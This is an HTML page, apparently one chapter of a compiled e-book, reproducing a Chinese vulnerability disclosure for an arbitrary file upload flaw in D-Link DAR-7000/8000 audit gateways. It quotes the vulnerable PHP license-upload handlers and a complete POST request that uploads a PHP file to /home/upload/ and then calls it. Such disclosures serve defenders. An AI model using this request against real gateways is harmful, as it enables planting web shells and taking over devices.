@@ -1,0 +1,66 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>D-Link/网神系列产品任意文件上传</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>D-Link/网神系列产品任意文件上传</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzI2MzA3OTgxOA==&amp;mid=2657158345&amp;idx=1&amp;sn=4dfb320203173e07d1a369cd326dc4bb&amp;chksm=f1d4f62cc6a37f3a6b6ff18012579c076359ecc8aba1291887effea36d43d000fc8b72468a01&amp;scene=126&amp;sessionid=1681404936#rd">http://mp.weixin.qq.com/s?__biz=MzI2MzA3OTgxOA==&amp;mid=2657158345&amp;idx=1&amp;sn=4dfb320203173e07d1a369cd326dc4bb&amp;chksm=f1d4f62cc6a37f3a6b6ff18012579c076359ecc8aba1291887effea36d43d000fc8b72468a01&amp;scene=126&amp;sessionid=1681404936#rd</a></blockquote><p>https://**.**.**.**:8443/home.php DAR-7000 系列上网行为审计网关<br style=""/>**.**.**.**:8443/home.php DAR-8000 系列上网行为审计网关</p><p><br/></p><p><br/></p><p>sysmanager/licenseauthorization.php:<br/><br/></p><fieldset><legend>code 区域</legend><pre>&lt;?php<br/>session_start();<br/>include_once('../funlist.php');<br/>include_once("../global.func.php");<br/>include_once("../include/global_inc.php");<br/>include_once("inc/sysmanage.inc.php");<br/>if($_SESSION['language']!="english")<br/>{<br/>
+	require_once ("../include/language_cn.php");<br/>}<br/>else <br/>{<br/>
+	require_once ("../include/language_en.php");<br/>}<br/>conn();<br/>$sess_username=$_SESSION['username'];<br/>$mode = "";<br/>if(isset($_POST['mode'])) $mode=$_POST['mode'];<br/>if($mode=="set")<br/>{<br/>
+	chdir("/home/");<br/>
+	if(!is_file("upload")) mkdir("upload",0777);<br/>
+	$http_licence_dir = "/home/upload/";<br/>
+	chdir($http_licence_dir);<br/>
+	exec("rm -rf *");<br/>
+	$upload_file = $_FILES['file_upload']['tmp_name'];<br/>
+	$upload_file_name = $_FILES['file_upload']['name'];<br/>
+	//echo $upload_file."&lt;br&gt;";<br/>
+	//echo $upload_file_name."&lt;br&gt;";<br/>
+	if(!copy($upload_file,$http_licence_dir.$upload_file_name))<br/>
+	{<br/>
+		add_optlog($sess_username,"licenseauthorization",GetIp(),"http方式升级License失败!");<br/>
+		alert("License上传失败!","licenseauthorization.php");<br/>
+		exit();<br/>
+	}<br/>
+	$str = "upgrade licence $http_licence_dir$upload_file_name\n";<br/>
+	$rbuf = socket($str);<br/>
+	//echo '&lt;pre&gt;';<br/>
+	//echo $str;<br/>
+	//echo $rbuf;<br/>
+	if(!strstr($rbuf,"0:"))</pre></fieldset><p><br/><br/><br/><br/><br/><br/><br/><br/>请求如下：<br/><br/>POST /sysmanage/licenseauthorization.php? HTTP/1.1<br/><br/>Host: **.**.**.**:8443<br/><br/>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0<br/><br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br/><br/>Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br/><br/>Accept-Encoding: gzip, deflate<br/><br/>Referer: https://**.**.**.**:8443/sysmanage/licenseauthorization.php<br/><br/>Cookie:<br/><br/>Connection: keep-alive<br/><br/>Content-Type: multipart/form-data; boundary=---------------------------12209292791551<br/><br/>Content-Length: 322<br/><br/><br/><br/>-----------------------------12209292791551<br/><br/>Content-Disposition: form-data; name="file_upload"; filename="xxa1a.php"<br/><br/>Content-Type: application/octet-stream<br/><br/><br/><br/>&lt;?phpinfo()?&gt;<br/><br/><br/><br/>-----------------------------12209292791551<br/><br/>Content-Disposition: form-data; name="mode"<br/><br/><br/><br/>set<br/><br/>-----------------------------12209292791551--<br/><br/><br/><br/><br/><br/>这样会在/home/upload/xxa1a.php<br/><br/><br/><br/>访问https://**.**.**.**:8443/home/upload/xxa1a.php<br/><br/></p><p><br/><br/><br/><br/><br/>第二处：<br/><br/>sysmanager/lience.php:<br/><br/></p><fieldset><legend>code 区域</legend><pre>&lt;?php<br/>session_start();<br/>include_once('../funlist.php');<br/>include_once("../global.func.php");<br/>include_once("../include/global_inc.php");<br/>include_once("inc/sysmanage.inc.php");<br/>include_once("../include/language_cn.php");<br/>conn();<br/>$sess_username=$_SESSION['username'];<br/>$mode = "";<br/>if(isset($_POST['mode'])) $mode=$_POST['mode'];<br/>if($mode=="set")<br/>{<br/>
+	$type=$_POST['ck'];<br/>
+	if($type == "radhttp") //http<br/>
+	{<br/>
+		chdir("/home/");<br/>
+		if(!is_file("upload")) mkdir("upload",0777);<br/>
+		$http_licence_dir = "/home/upload/";<br/>
+		chdir($http_licence_dir);<br/>
+		exec("rm -rf *");<br/>
+		$upload_file = $_FILES['file_upload']['tmp_name'];<br/>
+		$upload_file_name = $_FILES['file_upload']['name'];<br/>
+		/*echo $upload_file."&lt;br&gt;";<br/>
+		echo $upload_file_name."&lt;br&gt;";*/<br/><br/>
+		if(!copy($upload_file,$http_licence_dir.$upload_file_name))<br/>
+		{<br/>
+			add_optlog($sess_username,"licence",GetIp(),"$LANG_HTTPLICENCE_FAILD");<br/>
+			alert("$LANG_UPLOADLICENCE_FAILD","licence.php");<br/>
+			exit();<br/><br/>
+		}<br/>
+		$str = "upgrade licence $http_licence_dir$upload_file_name\n";<br/>
+		$rbuf = socket($str);<br/>
+		if(!strstr($rbuf,"0:"))<br/>
+		{<br/>
+			add_optlog($sess_username,"licence",GetIp(),"$LANG_HTTPLICENCE_FAILD");<br/>
+			alert("$LANG_UPDATELICENCE_FAILD","licence.php");<br/>
+			exit();<br/><br/>
+		}<br/>
+		add_optlog($sess_username,"licence",GetIp(),"$LANG_HTTPLICENCE_SUCCESS");<br/>
+		alert("$LANG_UPDATELICENCE_SUCCESS","licence.php");</pre></fieldset><p><br/><br/></p>
+        
+</body>
+</html>
